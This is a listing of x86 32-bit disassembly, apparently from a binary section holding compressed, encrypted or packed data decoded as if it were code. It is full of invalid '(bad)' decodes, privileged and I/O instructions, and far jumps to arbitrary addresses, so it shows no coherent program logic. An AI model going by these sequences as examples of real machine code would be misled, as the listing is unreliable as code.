  40e4e5:	cs inc ecx
  40e4e7:	cmc    
  40e4e8:	pop    eax
  40e4e9:	xchg   edx,eax
  40e4ea:	xchg   esi,eax
  40e4eb:	ins    DWORD PTR es:[edi],dx
  40e4ec:	pop    esi
  40e4ed:	mov    ebx,0x957e4112
  40e4f2:	xchg   bx,ax
  40e4f4:	add    al,0x24
  40e4f6:	jmp    0x47fdec16
  40e4fb:	rcr    edx,1
  40e4fd:	or     DWORD PTR [edx-0x39],edi
  40e500:	cli    
  40e501:	fisub  WORD PTR [ebx]
  40e503:	pop    ecx
  40e504:	je     0x40e4ed
  40e506:	adc    BYTE PTR [edx],0xb
  40e509:	xor    DWORD PTR [esi+0x2f],edi
  40e50c:	mov    esp,ebp
  40e50e:	cdq    
  40e50f:	loopne 0x40e553
  40e511:	jne    0x40e555
  40e513:	or     al,dl
  40e515:	(bad)  [edx-0x6aa8e374]
  40e51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51c:	jne    0x40e589
  40e51e:	xor    al,0xa4
  40e520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e521:	ror    edx,1
  40e523:	stos   BYTE PTR es:[edi],al
  40e524:	fisttp QWORD PTR [edx]
  40e526:	fisttp DWORD PTR [edi+0x7f]
  40e529:	mov    esi,0xf26a67a7
  40e52e:	jbe    0x40e557
  40e530:	fmul   QWORD PTR [eax]
  40e532:	(bad)  
  40e533:	outs   dx,DWORD PTR ds:[esi]
  40e534:	push   ebx
  40e535:	test   DWORD PTR [edx],edi
  40e537:	adc    al,0xff
  40e539:	clc    
  40e53a:	mov    dh,0xc6
  40e53c:	xor    al,0xba
  40e53e:	js     0x40e597
  40e540:	pusha  
  40e541:	mov    ecx,0xac528dc2
  40e546:	scas   al,BYTE PTR es:[edi]
  40e547:	popf   
  40e548:	aas    
  40e549:	fldenv [edx-0x773eb5e9]
  40e54f:	outs   dx,BYTE PTR ds:[esi]
  40e550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e551:	pop    ebx
  40e552:	sub    ebx,DWORD PTR [esi+edx*1]
  40e555:	cmp    esi,DWORD PTR [edx-0x55]
  40e558:	mov    al,ds:0x43b58b0d
  40e55d:	ret    0x88f0
  40e560:	in     al,dx
  40e561:	and    DWORD PTR [edx],edi
  40e563:	sub    bl,dl
  40e565:	pop    esi
  40e566:	xchg   esi,eax
  40e567:	mov    DWORD PTR [eax+0x4a],eax
  40e56a:	jecxz  0x40e563
  40e56c:	std    
  40e56d:	fistp  QWORD PTR [edx]
  40e56f:	mov    al,0x41
  40e571:	cmp    dl,dh
  40e573:	xor    ah,BYTE PTR [ebx+0x44a5bb79]
  40e579:	pop    ss
  40e57a:	cmp    al,0x27
  40e57c:	stos   BYTE PTR es:[edi],al
  40e57d:	ins    BYTE PTR es:[edi],dx
  40e57e:	pop    edx
  40e57f:	loope  0x40e503
  40e581:	xchg   BYTE PTR [edi],ah
  40e583:	sub    al,0xfb
  40e585:	cmp    DWORD PTR [ebp+eax*1-0x15],ecx
  40e589:	repz test al,0x74
  40e58c:	pop    eax
  40e58d:	cmp    eax,esp
  40e58f:	mov    WORD PTR [edx],?
  40e591:	add    DWORD PTR [edi-0x61db8c4e],eax
  40e597:	mov    esi,0x1e3507ca
  40e59c:	pop    ecx
  40e59d:	aad    0x6c
  40e59f:	mov    bh,ch
  40e5a1:	push   ss
  40e5a2:	mov    eax,ds:0x657ea26b
  40e5a7:	xor    ch,BYTE PTR [edi]
  40e5a9:	popa   
  40e5aa:	add    DWORD PTR ds:0x951edeb5,ebp
  40e5b0:	and    BYTE PTR [edx],0xd8
  40e5b3:	into   
  40e5b4:	cmp    al,ch
  40e5b6:	mov    ch,BYTE PTR [edi+edi*4+0x5c]
  40e5ba:	mov    ch,0x3d
  40e5bc:	push   ebx
  40e5bd:	jecxz  0x40e5dd
  40e5bf:	dec    ebp
  40e5c0:	add    al,0xad
  40e5c2:	inc    edi
  40e5c3:	sub    eax,0xd48f75c5
  40e5c8:	and    al,0xc9
  40e5ca:	mov    al,0x7f
  40e5cd:	push   ebx
  40e5ce:	rcl    DWORD PTR [edi+0x3f9b0ac2],cl
  40e5d4:	sub    ah,BYTE PTR [edx+0xdffc1ed]
  40e5da:	pop    ds
  40e5db:	mov    ch,BYTE PTR [eax]
  40e5dd:	mov    bh,0xea
  40e5df:	ret    
  40e5e0:	cmp    BYTE PTR [eax+0x338b175],0x29
  40e5e7:	stos   DWORD PTR es:[edi],eax
  40e5e8:	pop    ss
  40e5e9:	push   ebx
  40e5ea:	inc    ebx
  40e5eb:	(bad)  
  40e5ec:	lods   eax,DWORD PTR ds:[esi]
  40e5ed:	xchg   ebp,eax
  40e5ee:	shr    BYTE PTR [edx],cl
  40e5f0:	cmp    DWORD PTR [esi+ecx*2-0x32],edx
  40e5f4:	gs cwde 
  40e5f6:	scas   al,BYTE PTR es:[edi]
  40e5f7:	adc    DWORD PTR [eax-0x62],edx
  40e5fa:	mov    WORD PTR [edi-0x6278cac4],?
  40e600:	dec    edx
  40e601:	es iret 
  40e603:	rep stos DWORD PTR es:[edi],eax
  40e605:	test   al,0xf6
  40e607:	xchg   BYTE PTR [edi-0x28],bl
  40e60a:	and    BYTE PTR ds:0x9aa391f3,dl
  40e611:	sahf   
  40e612:	add    ebp,DWORD PTR [edi+0x1e]
  40e615:	jecxz  0x40e5d0
  40e617:	jb     0x40e653
  40e619:	pop    edi
  40e61a:	daa    
  40e61b:	and    eax,ebp
  40e61d:	jle    0x40e5b1
  40e61f:	sub    bl,BYTE PTR [eax+0x55ae9e00]
  40e625:	cmp    ebx,DWORD PTR [eax-0x289fabde]
  40e62b:	mov    ebx,DWORD PTR [ecx+0x49f0dc0c]
  40e631:	mov    al,ds:0xe9aeed5d
  40e636:	fimul  DWORD PTR [edx-0x61df917b]
  40e63c:	sub    eax,0x1e88b736
  40e641:	xor    BYTE PTR [esi-0x61],bl
  40e644:	lods   eax,DWORD PTR ds:[esi]
  40e645:	imul   edi,DWORD PTR [ecx-0x3d],0x2f
  40e649:	dec    edi
  40e64a:	mov    edx,0xc1c897f5
  40e64f:	xchg   esi,eax
  40e650:	sub    dl,al
  40e652:	arpl   WORD PTR [esi+0x154af0bd],di
  40e658:	jle    0x40e6b3
  40e65a:	popf   
  40e65b:	sub    al,0x20
  40e65d:	cdq    
  40e65e:	sub    eax,0xaaebfce9
  40e663:	mov    fs,WORD PTR [ebp-0x7dae4161]
  40e669:	cmp    esp,DWORD PTR [esi+0x9efd05b]
  40e66f:	ins    DWORD PTR es:[edi],dx
  40e670:	mov    ds:0x63617a79,al
  40e675:	ss aas 
  40e677:	test   DWORD PTR [eax-0x2a],0x5ff5b1f2
  40e67e:	mov    ds,WORD PTR [esi+0x1c6d4c26]
  40e684:	inc    ecx
  40e685:	ret    0xc17e
  40e688:	cmp    esi,edx
  40e68a:	neg    DWORD PTR [edi+0x7acef9a9]
  40e690:	mov    BYTE PTR [ecx+0x380b45d],bh
  40e696:	cld    
  40e697:	bound  edi,QWORD PTR [ebx]
  40e699:	je     0x40e68a
  40e69b:	mov    ebp,0x5b3d00b8
  40e6a0:	out    0xdc,eax
  40e6a2:	adc    esp,0xd1bda245
  40e6a8:	mov    ds:0x76f2bd5,al
  40e6ad:	add    ebx,DWORD PTR [edx-0x71b20e3c]
  40e6b3:	mov    cl,0x9c
  40e6b5:	push   esi
  40e6b6:	or     esp,ebx
  40e6b8:	nop
  40e6b9:	xor    eax,0xf11afe21
  40e6be:	push   ebp
  40e6bf:	pusha  
  40e6c0:	shl    BYTE PTR [edx],cl
  40e6c2:	pushf  
  40e6c3:	jb     0x40e6a7
  40e6c5:	ins    DWORD PTR es:[edi],dx
  40e6c6:	cmp    ecx,ecx
  40e6c8:	add    ah,0x3e
  40e6cb:	rcr    edi,0xc7
  40e6ce:	lds    ecx,FWORD PTR [eax-0x1c328206]
  40e6d4:	mov    ebx,0x3b58b3b4
  40e6d9:	aad    0xe3
  40e6db:	aaa    
  40e6dc:	dec    edi
  40e6dd:	xchg   esi,eax
  40e6de:	call   0x81d5:0x98a2e820
  40e6e5:	push   esp
  40e6e6:	pushf  
  40e6e7:	ret    
  40e6e8:	mov    bl,0x4e
  40e6ea:	or     al,0xa5
  40e6ec:	enter  0x2b26,0xf5
  40e6f0:	leave  
  40e6f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f2:	ror    BYTE PTR [ecx+0x27],0x1
  40e6f6:	and    DWORD PTR [edx+esi*4-0x25],edx
  40e6fa:	(bad)  
  40e6fc:	nop
  40e6fd:	push   ebx
  40e6fe:	xchg   edx,eax
  40e6ff:	jl     0x40e722
  40e701:	loop   0x40e6f7
  40e703:	fcomp  DWORD PTR [ebx*2-0x6f833052]
  40e70a:	cli    
  40e70b:	hlt    
  40e70c:	je     0x40e727
  40e70e:	cli    
  40e70f:	ficom  DWORD PTR [ebx-0x7d]
  40e712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e713:	fxch   st(0)
  40e715:	push   edx
  40e716:	js     0x40e762
  40e718:	iret   
  40e719:	mov    DWORD PTR [ecx-0x599b46ef],edx
  40e71f:	sahf   
  40e720:	je     0x40e78c
  40e722:	shl    DWORD PTR [edi+0x3bcba974],1
  40e728:	jge    0x40e6e7
  40e72a:	dec    eax
  40e72b:	fmul   st,st(3)
  40e72d:	jno    0x40e74d
  40e72f:	mov    WORD PTR [edi+0x33],?
  40e732:	sbb    al,0xdf
  40e734:	fs aad 0x99
  40e737:	arpl   WORD PTR [ecx],bx
  40e739:	sbb    BYTE PTR [edx-0x2],cl
  40e73c:	addr16 mov eax,ds:0x3cab
  40e740:	and    DWORD PTR [edx-0x23],esi
  40e743:	or     bl,BYTE PTR [ecx+0x23c9d00f]
  40e749:	loope  0x40e750
  40e74b:	nop
  40e74c:	inc    eax
  40e74d:	dec    edx
  40e74e:	jmp    0xa5a20e0d
  40e753:	out    dx,al
  40e754:	dec    edi
  40e755:	adc    BYTE PTR [edi-0x650d7b5f],dh
  40e75b:	push   cs
  40e75c:	in     eax,0x74
  40e75e:	xor    dl,0xbf
  40e761:	mov    eax,0x1630ab52
  40e766:	cmp    al,0x74
  40e768:	jecxz  0x40e7cc
  40e76a:	mov    ds:0x55bfecd6,al
  40e76f:	mov    dh,0x81
  40e771:	add    DWORD PTR [eax],ecx
  40e773:	into   
  40e774:	cmp    edx,DWORD PTR [edx-0x5e35016e]
  40e77a:	popa   
  40e77b:	pop    ecx
  40e77c:	stos   BYTE PTR es:[edi],al
  40e77d:	mov    ebx,0xfd9471fa
  40e782:	inc    eax
  40e783:	adc    esp,DWORD PTR [eax+0x76c78423]
  40e789:	fnclex 
  40e78b:	xchg   ecx,eax
  40e78c:	cli    
  40e78d:	pop    ds
  40e78e:	retf   0xca8e
  40e791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e792:	out    0xdf,eax
  40e794:	dec    esp
  40e795:	popf   
  40e796:	xor    eax,0x3df581f0
  40e79b:	data16 das 
  40e79d:	jecxz  0x40e7b2
  40e79f:	adc    ecx,DWORD PTR [edx-0x390f00d4]
  40e7a5:	shl    BYTE PTR [edi+0x32],1
  40e7a8:	out    dx,eax
  40e7a9:	mov    ebx,0xfeec441a
  40e7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7af:	mov    ecx,0xe15fd078
  40e7b4:	fcom   QWORD PTR [edx]
  40e7b6:	(bad)  
  40e7b7:	rcl    edx,1
  40e7b9:	fdivr  DWORD PTR [edi+ebx*8-0x2c2cdfc]
  40e7c0:	mov    bh,0x8d
  40e7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7c3:	hlt    
  40e7c4:	cmp    eax,0xaaa7ada6
  40e7c9:	mov    BYTE PTR [ecx-0x18],bl
  40e7cc:	and    ch,BYTE PTR [edi+0x2ad32295]
  40e7d2:	and    eax,0xd07d954c
  40e7d7:	in     eax,0xa5
  40e7d9:	or     esi,DWORD PTR [ecx+0x53]
  40e7dc:	popa   
  40e7dd:	push   esi
  40e7de:	je     0x40e836
  40e7e0:	mov    BYTE PTR [edx+0x23f967a],0xf6
  40e7e7:	mov    al,0xc0
  40e7e9:	sub    al,0x6e
  40e7eb:	pop    edx
  40e7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7ed:	or     eax,0x88552425
  40e7f2:	dec    edx
  40e7f3:	or     dh,dl
  40e7f5:	inc    ebx
  40e7f6:	es repz cwde 
  40e7f9:	jnp    0x40e87a
  40e7fb:	sbb    BYTE PTR [eax+0x63],dh
  40e7fe:	push   ebp
  40e7ff:	nop
  40e800:	dec    ecx
  40e801:	dec    ecx
  40e802:	(bad)  
  40e803:	mov    ds:0x5f4608f2,eax
  40e808:	fbld   TBYTE PTR [edi+0x32]
  40e80b:	paddd  mm2,QWORD PTR [ecx-0x701e1344]
  40e812:	sbb    DWORD PTR [eax],edx
  40e814:	out    0x58,al
  40e816:	(bad)  
  40e817:	out    dx,eax
  40e818:	cmp    eax,0x80fa6768
  40e81d:	scas   eax,DWORD PTR es:[edi]
  40e81e:	mov    eax,ds:0x9f41cf09
  40e823:	mov    dh,dl
  40e825:	pop    ds
  40e826:	xchg   BYTE PTR [esi+eiz*1],ah
  40e829:	sub    DWORD PTR [ecx],esi
  40e82b:	mov    esi,0xa2f403bb
  40e830:	pop    ecx
  40e831:	or     al,0xfc
  40e833:	pop    esi
  40e834:	push   esi
  40e835:	aad    0x18
  40e837:	fcom   st(2)
  40e839:	push   esp
  40e83a:	jecxz  0x40e8ae
  40e83c:	xor    BYTE PTR [esi-0x4f],al
  40e83f:	adc    cl,BYTE PTR [ecx]
  40e841:	mov    edx,0x21d825b8
  40e846:	arpl   WORD PTR [esi+0x5d],dx
  40e849:	fidiv  DWORD PTR gs:0x6e176341
  40e850:	cmc    
  40e851:	fdivr  QWORD PTR [edx+0x45e2dc45]
  40e857:	xor    eax,ecx
  40e859:	mov    bh,0xc9
  40e85b:	and    eax,0xe96285e5
  40e860:	sbb    BYTE PTR [ebx],ch
  40e862:	mov    al,0x63
  40e864:	fwait
  40e865:	adc    edi,DWORD PTR [edx]
  40e867:	mov    ds:0xf7ea8341,al
  40e86c:	sbb    DWORD PTR [esi+0x67ff89fe],eax
  40e872:	cmp    al,0xb3
  40e874:	pusha  
  40e875:	pop    ss
  40e876:	xchg   edi,eax
  40e877:	lea    eax,[ebp-0x19]
  40e87a:	sti    
  40e87b:	xchg   ebp,eax
  40e87c:	mov    BYTE PTR [ecx],cl
  40e87e:	aaa    
  40e87f:	aad    0xe7
  40e881:	jge    0x40e837
  40e883:	pusha  
  40e884:	mov    ebx,0x635c5f95
  40e889:	ror    edx,0x18
  40e88c:	xchg   esp,eax
  40e88d:	call   0x954f:0xdd0f311d
  40e894:	mov    ds:0x44a63949,al
  40e899:	jmp    0x17dc:0x5b64f771
  40e8a0:	cmp    edx,DWORD PTR [ebp-0x742c08db]
  40e8a6:	test   eax,0x530728f7
  40e8ab:	xlat   BYTE PTR ds:[ebx]
  40e8ac:	or     bh,dh
  40e8ae:	jnp    0x40e877
  40e8b0:	icebp  
  40e8b1:	xchg   edx,eax
  40e8b2:	inc    esi
  40e8b3:	jl     0x40e8ce
  40e8b5:	cmp    al,ch
  40e8b7:	retf   0xd8c1
  40e8ba:	add    DWORD PTR [esi+0x524824fb],ecx
  40e8c0:	loopne 0x40e8d9
  40e8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c3:	std    
  40e8c4:	outs   dx,DWORD PTR ds:[esi]
  40e8c5:	ds push cs
  40e8c7:	xlat   BYTE PTR ds:[ebx]
  40e8c8:	mov    WORD PTR [ecx],ds
  40e8ca:	iret   
  40e8cb:	popf   
  40e8cc:	xchg   esi,eax
  40e8cd:	adc    dh,ah
  40e8cf:	cmp    BYTE PTR [ebp-0x4e],ch
  40e8d2:	inc    ebp
  40e8d3:	fmul   QWORD PTR [edi+0x375e3476]
  40e8d9:	cmp    eax,0x80ab0d8f
  40e8de:	ja     0x40e941
  40e8e0:	aam    0x8e
  40e8e2:	lods   eax,DWORD PTR ds:[esi]
  40e8e3:	and    ch,BYTE PTR [ebx-0x3966f01b]
  40e8e9:	mov    ds:0x20ab6d17,al
  40e8ee:	sub    eax,0x7fb1f4f5
  40e8f3:	hlt    
  40e8f4:	cmp    BYTE PTR [edi+0x5],0x87
  40e8f8:	dec    ebp
  40e8f9:	sar    BYTE PTR [edi-0x200c8bcd],1
  40e8ff:	sbb    al,0xd1
  40e901:	bnd ret 0xa036
  40e905:	xchg   BYTE PTR [edi-0x27],bl
  40e908:	push   cs
  40e909:	pushf  
  40e90a:	inc    esi
  40e90b:	sub    ecx,edx
  40e90d:	enter  0xdd45,0x3e
  40e911:	fwait
  40e912:	shr    DWORD PTR [edi-0x4bab1447],0x56
  40e919:	jle    0x40e941
  40e91b:	pusha  
  40e91c:	and    DWORD PTR [ebp+0x35f40310],ebx
  40e922:	outs   dx,BYTE PTR ds:[esi]
  40e923:	and    DWORD PTR [ebx],0x2e
  40e926:	les    edx,FWORD PTR [edi+0x4ce5cef0]
  40e92c:	mov    WORD PTR [ecx+0x6d964f0d],fs
  40e932:	repnz shl BYTE PTR [edi],1
  40e935:	push   cs
  40e936:	xchg   esi,eax
  40e937:	inc    ebx
  40e938:	jmp    0x541f890
  40e93d:	xchg   DWORD PTR [edi+ecx*8-0x6aced850],ebp
  40e944:	mov    ds:0x634abbf7,eax
  40e949:	(bad)  
  40e94a:	neg    BYTE PTR [eax-0x30140329]
  40e950:	popf   
  40e951:	or     al,bh
  40e953:	xchg   esp,eax
  40e954:	adc    ch,ah
  40e956:	ins    DWORD PTR es:[edi],dx
  40e957:	xlat   BYTE PTR ds:[ebx]
  40e958:	xor    BYTE PTR [edi+0x38],al
  40e95b:	push   0xffffffb5
  40e95d:	push   edx
  40e95e:	je     0x40e9cb
  40e960:	and    BYTE PTR [ebx+0x121b7d52],0x31
  40e967:	push   esi
  40e968:	out    dx,eax
  40e969:	lahf   
  40e96a:	sub    eax,0x36ed18b3
  40e96f:	mov    ecx,ds
  40e971:	rcr    DWORD PTR [edi],1
  40e973:	mov    ecx,0x666ceebd
  40e978:	dec    ebx
  40e979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e97a:	jg     0x40e9ce
  40e97c:	jmp    0x40e9d6
  40e97e:	or     al,0x26
  40e980:	gs aas 
  40e982:	fdivr  QWORD PTR [ecx]
  40e984:	jno    0x40e9b6
  40e986:	ins    DWORD PTR es:[edi],dx
  40e987:	inc    esp
  40e988:	aaa    
  40e989:	xchg   edx,eax
  40e98a:	in     eax,dx
  40e98b:	mov    eax,0x6e9dcf4d
  40e990:	loop   0x40e97f
  40e992:	pop    eax
  40e993:	pop    esi
  40e994:	pop    ecx
  40e995:	push   ds
  40e996:	push   eax
  40e997:	push   ds
  40e998:	leave  
  40e999:	push   esi
  40e99a:	es retf 
  40e99c:	es ins DWORD PTR es:[edi],dx
  40e99e:	rol    esp,0xe8
  40e9a1:	or     BYTE PTR [eax-0x44ad2d9c],ah
  40e9a7:	jae    0x40e937
  40e9a9:	rol    BYTE PTR cs:[eax+ecx*4+0x60361a27],1
  40e9b1:	outs   dx,DWORD PTR ds:[esi]
  40e9b2:	mov    ss,WORD PTR [eax-0x6201eecb]
  40e9b8:	pop    edx
  40e9b9:	enter  0xbe24,0x8a
  40e9bd:	lahf   
  40e9be:	call   0x86522177
  40e9c3:	mov    cl,0xa2
  40e9c5:	inc    edi
  40e9c6:	mov    ebx,0xa91e8b17
  40e9cb:	fisttp WORD PTR [esi]
  40e9cd:	in     al,dx
  40e9ce:	fwait
  40e9cf:	xlat   BYTE PTR ds:[ebx]
  40e9d0:	jnp    0x40e96a
  40e9d2:	aam    0x2c
  40e9d4:	lahf   
  40e9d5:	inc    eax
  40e9d6:	(bad)  
  40e9d7:	mov    ebp,DWORD PTR [ebx]
  40e9d9:	(bad)
  40e9dc:	mov    ebp,0x558ea0b9
  40e9e1:	mov    ebp,0xc0b11151
  40e9e6:	mov    DWORD PTR [ecx-0x1e38ad5a],esi
  40e9ec:	rcl    DWORD PTR [eax-0x30edacce],0x17
  40e9f3:	pop    esp
  40e9f4:	jmp    0x40ea21
  40e9f6:	fucom  st(7)
  40e9f8:	repz jp 0x40ea31
  40e9fb:	fiadd  WORD PTR [ebx]
  40e9fd:	sahf   
  40e9fe:	inc    ebp
  40e9ff:	fiadd  DWORD PTR [ebp+0x18]
  40ea02:	pop    esp
  40ea03:	mov    ds:0xd272e3d6,eax
  40ea08:	cmp    dl,BYTE PTR ss:[ebx+edx*1]
  40ea0c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea0e:	dec    ebx
  40ea0f:	xor    BYTE PTR [edx-0x6b],ch
  40ea12:	retf   0x6de9
  40ea15:	lahf   
  40ea16:	pop    esi
  40ea17:	pop    ecx
  40ea18:	cmp    esp,DWORD PTR [esi-0x2c]
  40ea1b:	out    0x3c,al
  40ea1d:	test   eax,0x96ec415c
  40ea22:	inc    ebp
  40ea23:	jle    0x40e9ff
  40ea25:	adc    DWORD PTR [ecx-0x3a],edi
  40ea28:	mov    cs,WORD PTR [ebp-0x582e3170]
  40ea2e:	nop
  40ea2f:	push   edx
  40ea30:	lock mov esi,0x88bd0f7c
  40ea36:	outs   dx,DWORD PTR ds:[esi]
  40ea37:	mov    eax,0x389b535e
  40ea3c:	mov    eax,ds:0x9b65a58e
  40ea41:	popa   
  40ea42:	pop    ebp
  40ea43:	inc    esi
  40ea44:	shl    bh,cl
  40ea46:	sub    ecx,ecx
  40ea48:	and    edi,DWORD PTR [ebp-0x3f]
  40ea4b:	sub    eax,0xd506052f
  40ea50:	enter  0x2fe2,0x3
  40ea54:	inc    ecx
  40ea55:	leave  
  40ea56:	mov    ah,0x2b
  40ea58:	push   esp
  40ea59:	ret    0x3eb0
  40ea5c:	jne    0x40ea8e
  40ea5e:	sbb    eax,DWORD PTR [edx+0x63c2ef7c]
  40ea64:	pusha  
  40ea65:	cmp    BYTE PTR [esp+esi*4+0x1f06b9c9],bl
  40ea6c:	mov    cl,0xb4
  40ea6e:	push   ecx
  40ea6f:	or     al,0x4d
  40ea71:	js     0x40ea41
  40ea73:	or     bl,BYTE PTR [ebp-0x1a269ba1]
  40ea79:	retf   
  40ea7a:	xchg   edi,eax
  40ea7b:	sbb    BYTE PTR [esi+eax*1],al
  40ea7e:	xchg   edx,eax
  40ea7f:	cmp    DWORD PTR [ebp+0x1e],0x8612e2c3
  40ea86:	dec    esp
  40ea87:	dec    esp
  40ea88:	add    esi,edx
  40ea8a:	mov    ds:0xc3e1589f,eax
  40ea8f:	pop    edx
  40ea90:	pop    esp
  40ea91:	ja     0x40eab7
  40ea93:	inc    ecx
  40ea94:	mov    eax,ds:0x435b39e5
  40ea99:	daa    
  40ea9a:	imul   ebp,esp,0x3a1c3cb9
  40eaa0:	lods   eax,DWORD PTR ds:[esi]
  40eaa1:	leave  
  40eaa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaa3:	xchg   ebx,eax
  40eaa4:	lea    ebp,[edi+edi*8]
  40eaa7:	mov    ecx,0x140ac77
  40eaac:	push   ds
  40eaad:	adc    ah,BYTE PTR [ebx]
  40eaaf:	popa   
  40eab0:	mov    BYTE PTR [eax],al
  40eab2:	test   al,0xf8
  40eab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab5:	pop    ecx
  40eab6:	retf   0x76fc
  40eab9:	and    al,0x0
  40eabb:	clc    
  40eabc:	or     eax,0x9ca1e7e4
  40eac1:	mov    esp,0xaddc8075
  40eac6:	inc    esp
  40eac7:	pusha  
  40eac8:	xchg   bh,cl
  40eaca:	in     al,dx
  40eacb:	in     eax,dx
  40eacc:	jns    0x40ea82
  40eace:	ret    0x9b38
  40ead1:	loope  0x40ea7d
  40ead3:	sbb    eax,0x654d0427
  40ead8:	mov    dh,0xdf
  40eada:	pop    ebx
  40eadb:	dec    ebp
  40eadc:	mov    esp,0x3eeb6428
  40eae1:	pop    ss
  40eae2:	mov    WORD PTR ds:0x5cc0ecfe,ds
  40eae8:	inc    edi
  40eae9:	mov    al,0xf2
  40eaeb:	mov    bh,0x31
  40eaed:	icebp  
  40eaee:	ins    BYTE PTR es:[edi],dx
  40eaef:	(bad)  
  40eaf0:	call   0x97a2a74f
  40eaf5:	mov    cl,0x7d
  40eaf7:	test   DWORD PTR [edx-0x14],edi
  40eafa:	cmp    BYTE PTR ds:0x8a0c2234,ch
  40eb00:	in     eax,dx
  40eb01:	jbe    0x40eae3
  40eb03:	cmp    ch,dh
  40eb05:	and    BYTE PTR [esi+edx*8],ch
  40eb08:	das    
  40eb09:	pop    esi
  40eb0a:	push   cs
  40eb0b:	or     bl,cl
  40eb0d:	into   
  40eb0e:	mov    dh,0x3d
  40eb10:	lahf   
  40eb11:	aad    0x87
  40eb13:	jnp    0x40eb4f
  40eb15:	dec    eax
  40eb16:	dec    edx
  40eb17:	(bad)  
  40eb18:	push   edi
  40eb19:	cld    
  40eb1a:	stos   BYTE PTR es:[edi],al
  40eb1b:	in     al,dx
  40eb1c:	ss xor ebp,ebx
  40eb1f:	push   ds
  40eb20:	mov    ch,0xb3
  40eb22:	(bad)  
  40eb23:	fcmovb st,st(2)
  40eb25:	clc    
  40eb26:	xchg   ebx,eax
  40eb27:	add    edi,DWORD PTR [eax]
  40eb29:	adc    DWORD PTR [ebp+0x6988e9c9],ecx
  40eb2f:	pop    ebx
  40eb30:	loopne 0x40eb3c
  40eb32:	lea    ebp,[ebx-0x6e63d7d1]
  40eb38:	sbb    al,ch
  40eb3a:	add    dh,BYTE PTR [edi+0x1f11b7e0]
  40eb40:	popf   
  40eb41:	push   ss
  40eb42:	add    DWORD PTR [ecx+0x73aec95a],edi
  40eb48:	xor    DWORD PTR [esi+0x5a565257],0xffffffc5
  40eb4f:	jge    0x40ebc6
  40eb51:	jl     0x40eb54
  40eb53:	add    al,0x60
  40eb55:	sbb    eax,0xa52b38ea
  40eb5a:	adc    esi,ebx
  40eb5c:	push   eax
  40eb5d:	mov    WORD PTR [ecx+0xd26af08],ds
  40eb63:	ror    edi,1
  40eb65:	imul   eax,DWORD PTR [ecx+0x7771a691],0x26
  40eb6c:	sbb    ecx,DWORD PTR [edi]
  40eb6e:	rcl    DWORD PTR [edx-0x24],1
  40eb71:	xor    BYTE PTR [ebp+0x4cf26f25],0xa0
  40eb78:	iret   
  40eb79:	loopne 0x40ebd4
  40eb7b:	nop
  40eb7c:	bswap  edx
  40eb7e:	jae    0x40eb6b
  40eb80:	push   esi
  40eb81:	out    0x5,al
  40eb83:	mov    edx,0x5b89bc65
  40eb88:	mov    ebx,0x4cec8992
  40eb8d:	sub    ebp,DWORD PTR ds:0x886a4e83
  40eb93:	sbb    DWORD PTR [esi+0x7f41dfe8],ecx
  40eb99:	std    
  40eb9a:	iret   
  40eb9b:	fild   QWORD PTR [eax+0x7556a43e]
  40eba1:	lds    ebx,FWORD PTR [eax+eax*8]
  40eba4:	pushf  
  40eba5:	dec    ebp
  40eba6:	mov    bl,al
  40eba8:	adc    eax,0xbddaf25
  40ebad:	popa   
  40ebae:	retf   0xc725
  40ebb1:	sbb    dh,BYTE PTR [eax+0x77]
  40ebb4:	add    BYTE PTR ds:[esp+edi*1+0x2c],al
  40ebb9:	inc    ebp
  40ebba:	xchg   esi,eax
  40ebbb:	mov    ebp,0x420e9d4d
  40ebc0:	les    edi,FWORD PTR [edi]
  40ebc2:	and    dl,dh
  40ebc4:	sub    DWORD PTR ds:0xadea2632,0xffffffde
  40ebcb:	adc    al,0xe5
  40ebcd:	popa   
  40ebce:	add    ch,al
  40ebd0:	mov    edx,DWORD PTR [ebp-0xdea30c8]
  40ebd6:	outs   dx,DWORD PTR ds:[esi]
  40ebd7:	xchg   edi,eax
  40ebd8:	xchg   edi,eax
  40ebda:	and    edx,DWORD PTR [edi]
  40ebdc:	aad    0x1c
  40ebde:	les    edx,FWORD PTR [edx]
  40ebe0:	cmp    eax,0x86f6a6c4
  40ebe5:	retf   
  40ebe6:	inc    ebx
  40ebe7:	add    dh,BYTE PTR [ecx-0x33]
  40ebea:	rcr    BYTE PTR [ecx],1
  40ebec:	test   DWORD PTR es:[ecx+esi*1],esp
  40ebf0:	cld    
  40ebf1:	and    al,0xe0
  40ebf3:	retf   0x4954
  40ebf6:	test   ah,dh
  40ebf8:	cmp    al,0x5b
  40ebfa:	icebp  
  40ebfb:	sti    
  40ebfc:	cmp    eax,0xf91ba8e5
  40ec01:	fdiv   QWORD PTR [edi+eax*2]
  40ec04:	jle    0x40ec00
  40ec06:	jmp    0x40ec28
  40ec08:	popf   
  40ec09:	sub    al,0x46
  40ec0b:	stos   DWORD PTR es:[edi],eax
  40ec0c:	push   edi
  40ec0d:	mov    bl,0x73
  40ec0f:	(bad)  
  40ec10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec11:	rcr    DWORD PTR [ebp-0xbf0fd86],cl
  40ec17:	loopne 0x40ebc2
  40ec19:	push   ebx
  40ec1a:	mov    ch,0xd3
  40ec1c:	xchg   esp,eax
  40ec1d:	js     0x40ec13
  40ec1f:	stos   BYTE PTR es:[edi],al
  40ec20:	pop    esi
  40ec21:	mov    ch,0x9f
  40ec23:	scas   al,BYTE PTR es:[edi]
  40ec24:	scas   al,BYTE PTR es:[edi]
  40ec25:	scas   eax,DWORD PTR es:[edi]
  40ec26:	je     0x40ec4e
  40ec28:	neg    BYTE PTR [ebx-0x58]
  40ec2b:	outs   dx,DWORD PTR ds:[esi]
